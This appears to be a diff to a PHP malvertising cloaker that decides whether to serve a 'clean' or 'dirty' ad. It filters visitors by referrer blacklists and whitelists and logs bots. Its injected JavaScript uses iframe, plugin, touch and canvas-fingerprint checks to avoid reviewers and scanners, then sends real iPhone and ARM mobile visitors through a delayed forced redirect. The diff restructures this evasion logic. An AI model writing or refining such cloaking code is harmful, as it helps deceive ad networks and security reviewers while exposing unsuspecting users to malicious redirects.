@@ -159,19 +159,6 @@
 		return $resultHtml;
 	}
 
-	function replaceEmptyKeywordEmptyString($array)
-	{
-		foreach ($array as $key => $value)
-		{
-			if ($value == "_empty_")
-			{
-				$array[$key] = "";
-			}
-		}
-
-		return $array;
-	}
-
 	function adlog($campaignID, $txt)
 	{
 		$f = fopen("logs/adlog.$campaignID.log","a");
@@ -252,9 +239,6 @@
 	$consoleLoggingEnabled 			= array_key_exists("ConsoleLoggingEnabled", $adConfig) && $adConfig["ConsoleLoggingEnabled"] === "false" ? false : true;
 	$forceDirtyAd 					= array_key_exists("ForceDirtyAd", $adConfig) && $adConfig["ForceDirtyAd"] === "false" ? false : true;
 
-	$blacklistedReferrers = replaceEmptyKeywordEmptyString($blacklistedReferrers);
-	$whitelistedReferrers = replaceEmptyKeywordEmptyString($whitelistedReferrers);
-
 	if (empty($redirectUrl))
 	{
 		exit;
@@ -288,25 +272,16 @@
 
 	$serveCleanAd = false;
 
-	if (!$serveCleanAd && array_key_exists('HTTP_REFERER', $_SERVER))
+	if (!array_key_exists("HTTP_REFERER", $_SERVER) || $_SERVER['HTTP_REFERER'] === "")
+	{
+		$_SERVER['HTTP_REFERER'] = "_empty_";
+	}
+
+	if (!$serveCleanAd)
 	{
 		foreach ($blacklistedReferrers as $blackListedReferrer)
 		{
-			if ($_SERVER['HTTP_REFERER'] === "")
-			{
-				if ($_SERVER['HTTP_REFERER'] == $blackListedReferrer)
-				{
-					$serveCleanAd = true;
-
-					if ($loggingEnabled)
-					{
-						mbotlog($campaignID, $ip, $isp['isp'], "EMPTY Referrer is in blacklist.");
-					}
-
-					break;					
-				}
-			}
-			elseif (strpos($_SERVER['HTTP_REFERER'], $blackListedReferrer) !== false)
+			if (strpos($_SERVER['HTTP_REFERER'], $blackListedReferrer) !== false)
 			{
 				$serveCleanAd = true;
 
@@ -325,16 +300,7 @@
 
 			foreach ($whitelistedReferrers as $whitelistedReferrer)
 			{
-				if ($_SERVER['HTTP_REFERER'] === "")
-				{
-					if ($_SERVER['HTTP_REFERER'] == $whitelistedReferrer)
-					{
-						$matchedWhitelistedReferrer = true;
-
-						break;
-					}
-				}
-				elseif (strpos($_SERVER['HTTP_REFERER'], $whitelistedReferrer) !== false)
+				if (strpos($_SERVER['HTTP_REFERER'], $whitelistedReferrer) !== false)
 				{
 					$matchedWhitelistedReferrer = true;
 
@@ -349,7 +315,7 @@
 				if ($loggingEnabled)
 				{
 					mbotlog($campaignID, $ip, $isp['isp'], "Referrer $_SERVER[HTTP_REFERER] is not in whitelist.");
-				}				
+				}
 			}
 		}
 	}
@@ -572,121 +538,66 @@
 
 		$scriptCode = "<script type=\"text/javascript\">
 
+						var testResults = [];
+
+						function isTrue(value)
+						{
+							return value === true;
+						}
+
 						if (typeof jslog !== 'function')
 						{
 							jslog = function(text) { " . ($consoleLoggingEnabled ? "console.log(text);" : "") . " }
 						}" .
+
 						($trackingPixelEnabled && !empty($trackingPixelUrl) ? $trackingPixelScript : "") .
-						($canvasFingerprintCheckEnabled && !empty($blockedCanvasFingerprints) ?
-						   "function getCanvasFingerprint()
+
+					   	($iframeCloakingEnabled ? file_get_contents("js/iframetest.js") : "") .
+			   			($pluginCloakingEnabled ? file_get_contents("js/plugintest.js") : "") .
+			   			($touchCloakingEnabled ? file_get_contents("js/touchtest.js") : "") .
+						($canvasFingerprintCheckEnabled && !empty($blockedCanvasFingerprints) ? file_get_contents("js/canvasfingerprinttest.js") : "") .
+
+					   "
+					   	function inBlockedCanvasList()
+						{
+							var blockedList = [null, $blockedCanvasFingerprints];
+							var canvasFingerPrint = getCanvasFingerprint();
+
+							var result = blockedList.indexOf(canvasFingerPrint) !== -1;
+
+							if (result)
 							{
-								var canvas = document.createElement('canvas');
-								var ctx = canvas.getContext('2d');
-								var txt = 'i9asdm..$#po((^@KbXrww!~cz';
-
-								ctx.textBaseline = 'top';
-								ctx.font = \"16px 'Arial'\";
-								ctx.textBaseline = 'alphabetic';
-								ctx.rotate(.05);
-								ctx.fillStyle = '#f60';
-								ctx.fillRect(125,1,62,20);
-								ctx.fillStyle = '#069';
-								ctx.fillText(txt, 2, 15);
-								ctx.fillStyle = 'rgba(102, 200, 0, 0.7)';
-								ctx.fillText(txt, 4, 17);
-								ctx.shadowBlur = 10;
-								ctx.shadowColor = 'blue';
-								ctx.fillRect(-20,10,234,5);
-								var strng = canvas.toDataURL();
-
-								var hash = 0;
-
-								if (strng.length == 0)
-								{
-									return null;
-								}
-
-								for (i = 0; i < strng.length; i++)
-								{
-									var chr = strng.charCodeAt(i);
-									hash = ((hash << 5) - hash) + chr;
-									hash = hash & hash;
-								}
-
-								jslog('Canvas fingerprint: ' + hash);
-
-								return hash;
+								jslog('canvasFingerPrint: ' + canvasFingerPrint + ' in blocked list.');
+							}
+							else
+							{
+								jslog('canvasFingerPrint: ' + canvasFingerPrint + ' NOT in blocked list.');
 							}
 
-							function inBlockedCanvasList()
-							{
-								var blockedList = [null, $blockedCanvasFingerprints];
-								var canvasFingerPrint = getCanvasFingerprint();
+							return result;
+						}
 
-								var result = blockedList.indexOf(canvasFingerPrint) !== -1;
+						$referrerDomainScript
 
-								if (result)
+						function go()
+						{\n" .
+							($trackingPixelEnabled && !empty($trackingPixelUrl) ? "addTrackingPixel();\n" : "") .
+						   	($iframeCloakingEnabled ? "testResults.push(inIFrame());\n" : "") .
+				   			($pluginCloakingEnabled ? "testResults.push(!hasPlugins());\n" : "") .
+				   			($touchCloakingEnabled ? "testResults.push(isTouch());\n" : "") .
+							($canvasFingerprintCheckEnabled && !empty($blockedCanvasFingerprints) ? "testResults.push(!inBlockedCanvasList());\n" : "") .							
+						   "jslog(testResults);
+
+						   	if (/(iphone|linux armv)/i.test(window.navigator.platform) && testResults.every(isTrue))
+						    {
+							    setTimeout(function()
 								{
-									jslog('canvasFingerPrint: ' + canvasFingerPrint + ' in blocked list.');
-								}
-								else
-								{
-									jslog('canvasFingerPrint: ' + canvasFingerPrint + ' NOT in blocked list.');
-								}
+									var topDomain = getReferrerDomain();
 
-								return result;
-							}" : "") .
-
-						   "$referrerDomainScript
-
-						    function inIFrame()
-							{
-							    try
-							    {
-							        return window.self !== window.top;
-							    }
-							    catch (e)
-							    {
-							        return true;
-							    }
+									$redirectCode
+								}, $redirectTimeout);
 							}
-
-							function go()
-							{" .
-								($trackingPixelEnabled && !empty($trackingPixelUrl) ? "addTrackingPixel();\n" : "") .
-							   	($iframeCloakingEnabled ? 
-							   	"if (inIFrame())" : "") .
-						   		"{" .
-						   			($pluginCloakingEnabled ? 
-								    "if (navigator.plugins.length == 0)" : "") .
-								    "{" .
-							   			($touchCloakingEnabled ?
-							   		   "if (('ontouchstart' in window) ||	/* All standard browsers, except IE */
-			  								(navigator.MaxTouchPoints > 0)	|| (navigator.msMaxTouchPoints > 0))" : "") .
-									   "{" .
-										($canvasFingerprintCheckEnabled && !empty($blockedCanvasFingerprints) ?
-										   "if (inBlockedCanvasList())
-											{
-												return;
-											}" : "") .
-										   "if (/(iphone|linux armv)/i.test(window.navigator.platform))
-										    {
-											    setTimeout(function()
-												{
-													var topDomain = getReferrerDomain();
-
-													$redirectCode
-												}, $redirectTimeout);
-											}
-										}" .
-										($touchCloakingEnabled ?
-									   "else
-										{
-											jslog('Touch test failed.');
-										}" : "") .
-						   	   "	}
-						   		}
-						   	}
+					   	}
 
 					   </script>";
 
